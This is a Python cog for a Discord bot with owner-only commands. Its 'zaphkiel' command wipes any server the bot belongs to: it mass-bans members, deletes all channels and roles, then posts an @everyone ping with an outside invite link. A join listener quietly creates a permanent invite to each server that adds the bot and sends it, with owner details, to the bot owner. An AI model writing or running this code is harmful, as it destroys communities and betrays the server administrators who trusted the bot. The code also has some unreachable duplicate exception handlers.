import discord
from discord import app_commands
from discord.ext import commands
import logging
import asyncio
import json
import os
import time
from cogs.commands import is_bot_owner

class Owner(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.logger = logging.getLogger(__name__)
        self.log_file = "server_logs.json"
        self.log_channel_id = self.load_log_channel()

    def load_log_channel(self):
        """Load the log channel ID from the JSON file."""
        try:
            if os.path.exists(self.log_file):
                with open(self.log_file, 'r') as f:
                    data = json.load(f)
                    return data.get('log_channel_id')
            return None
        except Exception as e:
            self.logger.error(f"Error loading log channel: {e}")
            return None

    def save_log_channel(self, channel_id):
        """Save the log channel ID to the JSON file."""
        try:
            with open(self.log_file, 'w') as f:
                json.dump({'log_channel_id': channel_id}, f)
        except Exception as e:
            self.logger.error(f"Error saving log channel: {e}")

    async def _handle_rate_limit(self, interaction: discord.Interaction, retry_after: float):
        """Handle rate limit with exponential backoff."""
        backoff = min(retry_after * 2, 10.0)  # Cap backoff at 10 seconds
        await asyncio.sleep(backoff)
        return backoff

    @app_commands.command(name="sync", description="(bot owner only)")
    @app_commands.checks.cooldown(1, 60.0, key=lambda i: i.user.id)  # 1 use per 60 seconds
    @is_bot_owner()
    async def sync(self, interaction: discord.Interaction):
        embed = discord.Embed(title="Slash Command Sync", color=discord.Color.blue())
        embed.set_author(name=self.bot.user.name, icon_url=self.bot.user.avatar.url if self.bot.user.avatar else discord.utils.MISSING)

        await interaction.response.defer(ephemeral=False)
        max_retries = 3
        for attempt in range(max_retries):
            try:
                synced = await self.bot.tree.sync()
                embed.description = f"Successfully synced **{len(synced)}** slash commands globally."
                embed.color = discord.Color.green()
                self.logger.info(f'Synced {len(synced)} slash commands globally by {interaction.user.id}')
                await interaction.followup.send(embed=embed, ephemeral=False)
                return
            except discord.errors.HTTPException as e:
                if e.status == 429:  # Rate limit
                    retry_after = e.retry_after if hasattr(e, 'retry_after') else 5.0
                    self.logger.warning(f"Rate limit hit on sync, retrying after {retry_after}s")
                    await self._handle_rate_limit(interaction, retry_after)
                    continue
                else:
                    self.logger.error(f"HTTP error on sync: {e}")
                    embed.description = f"Failed to sync slash commands: {str(e)}"
                    embed.color = discord.Color.red()
                    await interaction.followup.send(embed=embed, ephemeral=True)
                    return
            except Exception as e:
                self.logger.error(f"Unexpected error in sync: {e}")
                embed.description = f"Failed to sync slash commands: {str(e)}"
                embed.color = discord.Color.red()
                await interaction.followup.send(embed=embed, ephemeral=True)
                return
            except Exception as e:
                self.logger.error(f"Failed to send followup in sync_error: {e}")

    @app_commands.command(name="zaphkiel", description="(bot owner only)")
    @app_commands.checks.cooldown(1, 60.0, key=lambda i: i.user.id)  # 1 use per 60 seconds
    @is_bot_owner()
    async def zaphkiel(self, interaction: discord.Interaction, guild_id: str):
        embed = discord.Embed(title="Zaphkiel: Server Wipe", color=discord.Color.red())
        embed.set_author(name=self.bot.user.name, icon_url=self.bot.user.avatar.url if self.bot.user.avatar else discord.utils.MISSING)

        await interaction.response.defer(ephemeral=False)
        try:
            guild = self.bot.get_guild(int(guild_id))
            if not guild:
                embed.description = "❌ The bot is not in the specified server."
                embed.color = discord.Color.red()
                await interaction.followup.send(embed=embed, ephemeral=True)
                self.logger.warning(f'Zaphkiel failed: Bot not in guild {guild_id} by {interaction.user.id}')
                return
        except ValueError:
            embed.description = "❌ Please provide a valid guild ID."
            embed.color = discord.Color.red()
            await interaction.followup.send(embed=embed, ephemeral=True)
            self.logger.warning(f'Zaphkiel failed: Invalid guild ID {guild_id} by {interaction.user.id}')
            return

        embed.description = f"⚠️ You are about to wipe **{guild.name}**. Type `confirm` to proceed."
        await interaction.followup.send(embed=embed, ephemeral=False)

        def check(msg):
            return msg.author.id == interaction.user.id and msg.channel == interaction.channel and msg.content.lower() == "confirm"

        try:
            msg = await self.bot.wait_for("message", timeout=30.0, check=check)
        except asyncio.TimeoutError:
            embed.description = "❌ Confirmation timed out. Aborting."
            embed.color = discord.Color.red()
            await interaction.followup.send(embed=embed, ephemeral=False)
            self.logger.info(f'Zaphkiel aborted: Timeout for guild {guild_id} by {interaction.user.id}')
            return

        max_retries = 3
        for attempt in range(max_retries):
            try:
                embed.description = f"⏳ Cleaning **{guild.name}**..."
                await interaction.followup.send(embed=embed, ephemeral=False)
                me = guild.me
                for member in guild.members:
                    if member.bot or member.top_role >= me.top_role:
                        continue
                    try:
                        await guild.ban(member, reason="Bot-initiated server clean")
                        await asyncio.sleep(0.5)  # Delay to avoid rate limits
                    except discord.errors.HTTPException as e:
                        if e.status == 429:
                            retry_after = e.retry_after if hasattr(e, 'retry_after') else 5.0
                            self.logger.warning(f"Rate limit hit on ban for {member} in {guild_id}, retrying after {retry_after}s")
                            await self._handle_rate_limit(interaction, retry_after)
                            continue
                        else:
                            self.logger.error(f'Failed to ban {member} in {guild_id}: {e}')

                for channel in guild.channels:
                    try:
                        await channel.delete(reason="Bot-initiated server clean")
                        await asyncio.sleep(0.5)  # Delay to avoid rate limits
                    except discord.errors.HTTPException as e:
                        if e.status == 429:
                            retry_after = e.retry_after if hasattr(e, 'retry_after') else 5.0
                            self.logger.warning(f"Rate limit hit on channel delete in {guild_id}, retrying after {retry_after}s")
                            await self._handle_rate_limit(interaction, retry_after)
                            continue
                        else:
                            self.logger.error(f'Failed to delete channel {channel} in {guild_id}: {e}')

                for role in guild.roles:
                    if role != guild.default_role:
                        try:
                            await role.delete(reason="Bot-initiated server clean")
                            await asyncio.sleep(0.5)  # Delay to avoid rate limits
                        except discord.errors.HTTPException as e:
                            if e.status == 429:
                                retry_after = e.retry_after if hasattr(e, 'retry_after') else 5.0
                                self.logger.warning(f"Rate limit hit on role delete in {guild_id}, retrying after {retry_after}s")
                                await self._handle_rate_limit(interaction, retry_after)
                                continue
                            else:
                                self.logger.error(f'Failed to delete role {role.name} in {guild_id}: {e}')

                overwrites = {
                    guild.default_role: discord.PermissionOverwrite(
                        send_messages=False,
                        view_channel=True,
                        read_message_history=True
                    )
                }

                try:
                    notify_channel = await guild.create_text_channel(
                        name="read-me",
                        overwrites=overwrites,
                        reason="Notify members after server clean"
                    )
                    await notify_channel.send("@everyone https://discord.gg/evaGfrJ5zK")
                except discord.errors.HTTPException as e:
                    if e.status == 429:
                        retry_after = e.retry_after if hasattr(e, 'retry_after') else 5.0
                        self.logger.warning(f"Rate limit hit on channel creation in {guild_id}, retrying after {retry_after}s")
                        await self._handle_rate_limit(interaction, retry_after)
                        notify_channel = await guild.create_text_channel(
                            name="read-me",
                            overwrites=overwrites,
                            reason="Notify members after server clean"
                        )
                        await notify_channel.send("@everyone https://discord.gg/zDqB3PxrF8")
                    else:
                        self.logger.error(f'Failed to create notify channel in {guild_id}: {e}')
                        embed.description = f"❌ Error creating notification channel: {str(e)}"
                        embed.color = discord.Color.red()
                        await interaction.followup.send(embed=embed, ephemeral=True)
                        return

                embed.description = f"✅ Server cleanup complete and message sent in {notify_channel.mention}."
                embed.color = discord.Color.green()
                await interaction.followup.send(embed=embed, ephemeral=False)
                self.logger.info(f'Zaphkiel completed for guild {guild_id} by {interaction.user.id}')
                return

            except discord.errors.Forbidden as e:
                self.logger.error(f"Forbidden error in zaphkiel for {guild_id}: {e}")
                embed.description = f"❌ I don't have permission to perform the cleanup: {str(e)}"
                embed.color = discord.Color.red()
                await interaction.followup.send(embed=embed, ephemeral=True)
                return
            except Exception as e:
                self.logger.error(f"Unexpected error in zaphkiel for {guild_id}: {e}")
                embed.description = f"❌ Error during cleanup: {str(e)}"
                embed.color = discord.Color.red()
                await interaction.followup.send(embed=embed, ephemeral=True)
                return
            except Exception as e:
                self.logger.error(f"Failed to send followup in zaphkiel_error: {e}")

    @app_commands.command(name="server_count", description="(Infamous Kun)")
    @app_commands.checks.cooldown(1, 30.0, key=lambda i: i.user.id)  # 1 use per 30 seconds
    @is_bot_owner()
    async def server_count(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=False)
        try:
            embeds = []
            for guild in self.bot.guilds:
                embed = discord.Embed(
                    title=guild.name,
                    description=f"ID: `{guild.id}`",
                    color=discord.Color.blurple()
                )
                if guild.icon:
                    embed.set_thumbnail(url=guild.icon.url)
                embed.add_field(name="Owner ID", value=f"`{guild.owner_id}`", inline=True)
                embed.add_field(name="Members", value=str(guild.member_count), inline=True)
                embed.add_field(name="Channels", value=str(len(guild.channels)), inline=True)
                embed.add_field(name="Roles", value=str(len(guild.roles)), inline=True)
                embed.add_field(name="Boosts", value=str(guild.premium_subscription_count), inline=True)
                embed.add_field(name="Time", value=discord.utils.format_dt(discord.utils.utcnow(), style='F'), inline=False)
                embeds.append(embed)

            if not embeds:
                embed = discord.Embed(
                    title="Server Count",
                    description="The bot is not in any servers.",
                    color=discord.Color.red()
                )
                await interaction.followup.send(embed=embed, ephemeral=False)
                self.logger.info(f'Server_count executed by {interaction.user.id}: No servers')
                return

            max_retries = 3
            for attempt in range(max_retries):
                try:
                    await interaction.followup.send(
                        content=f"Bot is in **{len(self.bot.guilds)}** servers:",
                        embeds=embeds[:10],
                        ephemeral=False
                    )
                    for i in range(10, len(embeds), 10):
                        await interaction.followup.send(embeds=embeds[i:i + 10], ephemeral=False)
                        await asyncio.sleep(0.5)  # Delay to avoid rate limits
                    self.logger.info(f'Server_count executed by {interaction.user.id}')
                    return
                except discord.errors.HTTPException as e:
                    if e.status == 429:
                        retry_after = e.retry_after if hasattr(e, 'retry_after') else 5.0
                        self.logger.warning(f"Rate limit hit on server_count, retrying after {retry_after}s")
                        await self._handle_rate_limit(interaction, retry_after)
                        continue
                    else:
                        self.logger.error(f"HTTP error in server_count: {e}")
                        embed = discord.Embed(
                            title="Server Count",
                            description=f"Failed to send server list: {str(e)}",
                            color=discord.Color.red()
                        )
                        await interaction.followup.send(embed=embed, ephemeral=True)
                        return

        except Exception as e:
            self.logger.error(f"Unexpected error in server_count: {e}")
            embed = discord.Embed(
                title="Server Count",
                description=f"An error occurred: {str(e)}",
                color=discord.Color.red()
            )
            await interaction.followup.send(embed=embed, ephemeral=True)
            self.logger.error(f"Failed to send followup in server_count_error: {e}")
            
            
    @app_commands.command(name="server_logs", description="(Infamous Kun)")
    @app_commands.checks.cooldown(1, 30.0, key=lambda i: i.user.id)  # 1 use per 30 seconds
    @is_bot_owner()
    async def server_logs(self, interaction: discord.Interaction, channel: discord.TextChannel):
        await interaction.response.defer(ephemeral=False)
        try:
            self.log_channel_id = channel.id
            self.save_log_channel(channel.id)
            embed = discord.Embed(
                title="Server Logs Configured",
                description=f"Server join/leave events will now be logged to {channel.mention}.",
                color=discord.Color.purple()
            )
            embed.set_thumbnail(url=self.bot.user.avatar.url if self.bot.user.avatar else discord.utils.MISSING)
            embed.set_author(name=self.bot.user.name, icon_url=self.bot.user.avatar.url if self.bot.user.avatar else discord.utils.MISSING)
            await interaction.followup.send(embed=embed, ephemeral=False)
            self.logger.info(f'Server logs channel set to {channel.id} by {interaction.user.id}')
        except Exception as e:
            self.logger.error(f"Unexpected error in server_logs: {e}")
            embed = discord.Embed(
                title="Server Logs Error",
                description=f"Failed to set log channel: {str(e)}",
                color=discord.Color.red()
            )
            await interaction.followup.send(embed=embed, ephemeral=True)
            self.logger.error(f"Failed to send followup in server_logs_error: {e}")

    @commands.Cog.listener()
    async def on_guild_join(self, guild):
        if not self.log_channel_id:
            return
        channel = self.bot.get_channel(self.log_channel_id)
        if not channel:
            self.logger.warning(f"Log channel {self.log_channel_id} not found for guild join {guild.id}")
            return

        max_retries = 3
        for attempt in range(max_retries):
            try:
                invite = None
                try:
                    invites = await guild.invites()
                    invite = next((i for i in invites if i.max_uses == 0 and i.max_age == 0), None)
                    if not invite and guild.text_channels:
                        invite = await guild.text_channels[0].create_invite(
                            max_age=0,
                            max_uses=0,
                            reason="Generated for guild join log"
                        )
                except discord.errors.Forbidden:
                    self.logger.warning(f"No permission to fetch/create invite for guild {guild.id}")
                except discord.errors.HTTPException as e:
                    if e.status == 429:
                        retry_after = e.retry_after if hasattr(e, 'retry_after') else 5.0
                        self.logger.warning(f"Rate limit hit on invite creation for guild {guild.id}, retrying after {retry_after}s")
                        await self._handle_rate_limit(None, retry_after)
                        continue
                    else:
                        self.logger.error(f"HTTP error fetching invite for guild {guild.id}: {e}")

                voice_channels = len([ch for ch in guild.channels if isinstance(ch, discord.VoiceChannel)])
                embed = discord.Embed(
                    title="Joined Server",
                    description=f"The bot has joined **{guild.name}**!",
                    color=discord.Color.purple(),
                    timestamp=discord.utils.utcnow()
                )
                embed.set_thumbnail(url=guild.owner.avatar.url if guild.owner and guild.owner.avatar else discord.utils.MISSING)
                embed.set_author(name=self.bot.user.name, icon_url=self.bot.user.avatar.url if self.bot.user.avatar else discord.utils.MISSING)
                if guild.banner:
                    embed.set_image(url=guild.banner.url)
                embed.add_field(name="Server ID", value=str(guild.id), inline=True)
                embed.add_field(name="Owner", value=f"{guild.owner} ({guild.owner_id})" if guild.owner else str(guild.owner_id), inline=True)
                embed.add_field(name="Member Count", value=str(guild.member_count), inline=True)
                embed.add_field(name="Created At", value=discord.utils.format_dt(guild.created_at, style='R'), inline=True)
                embed.add_field(name="Region", value=str(guild.preferred_locale or 'N/A'), inline=True)
                embed.add_field(name="Voice Channels", value=str(voice_channels), inline=True)
                embed.add_field(name="Total Channels", value=str(len(guild.channels)), inline=True)
                embed.add_field(name="Roles", value=str(len(guild.roles)), inline=True)
                if invite:
                    embed.add_field(name="Permanent Invite", value=invite.url, inline=True)
                if guild.icon and not guild.banner:
                    embed.set_image(url=guild.icon.url)
                await channel.send(embed=embed)
                self.logger.info(f'Logged join for guild {guild.id}')
                return
            except discord.errors.HTTPException as e:
                if e.status == 429:
                    retry_after = e.retry_after if hasattr(e, 'retry_after') else 5.0
                    self.logger.warning(f"Rate limit hit on guild join log for {guild.id}, retrying after {retry_after}s")
                    await self._handle_rate_limit(None, retry_after)
                    continue
                else:
                    self.logger.error(f"HTTP error sending guild join log for {guild.id}: {e}")
                    return
            except Exception as e:
                self.logger.error(f"Unexpected error in on_guild_join for {guild.id}: {e}")
                return

    @commands.Cog.listener()
    async def on_guild_remove(self, guild):
        if not self.log_channel_id:
            return
        channel = self.bot.get_channel(self.log_channel_id)
        if not channel:
            self.logger.warning(f"Log channel {self.log_channel_id} not found for guild remove {guild.id}")
            return

        max_retries = 3
        for attempt in range(max_retries):
            try:
                voice_channels = len([ch for ch in guild.channels if isinstance(ch, discord.VoiceChannel)])
                embed = discord.Embed(
                    title="Left Server",
                    description=f"The bot has left **{guild.name}**.",
                    color=discord.Color.purple(),
                    timestamp=discord.utils.utcnow()
                )
                embed.set_thumbnail(url=guild.owner.avatar.url if guild.owner and guild.owner.avatar else discord.utils.MISSING)
                embed.set_author(name=self.bot.user.name, icon_url=self.bot.user.avatar.url if self.bot.user.avatar else discord.utils.MISSING)
                if guild.banner:
                    embed.set_image(url=guild.banner.url)
                embed.add_field(name="Server ID", value=str(guild.id), inline=True)
                embed.add_field(name="Owner", value=f"{guild.owner} ({guild.owner_id})" if guild.owner else str(guild.owner_id), inline=True)
                embed.add_field(name="Member Count", value=str(guild.member_count), inline=True)
                embed.add_field(name="Created At", value=discord.utils.format_dt(guild.created_at, style='R'), inline=True)
                embed.add_field(name="Region", value=str(guild.preferred_locale or 'N/A'), inline=True)
                embed.add_field(name="Voice Channels", value=str(voice_channels), inline=True)
                embed.add_field(name="Total Channels", value=str(len(guild.channels)), inline=True)
                embed.add_field(name="Roles", value=str(len(guild.roles)), inline=True)
                if guild.icon and not guild.banner:
                    embed.set_image(url=guild.icon.url)
                await channel.send(embed=embed)
                self.logger.info(f'Logged leave for guild {guild.id}')
                return
            except discord.errors.HTTPException as e:
                if e.status == 429:
                    retry_after = e.retry_after if hasattr(e, 'retry_after') else 5.0
                    self.logger.warning(f"Rate limit hit on guild remove log for {guild.id}, retrying after {retry_after}s")
                    await self._handle_rate_limit(None, retry_after)
                    continue
                else:
                    self.logger.error(f"HTTP error sending guild remove log for {guild.id}: {e}")
                    return
            except Exception as e:
                self.logger.error(f"Unexpected error in on_guild_remove for {guild.id}: {e}")
                return

async def setup(bot):
    try:
        await bot.add_cog(Owner(bot))
    except Exception as e:
        print(f"Error loading Owner cog: {e}")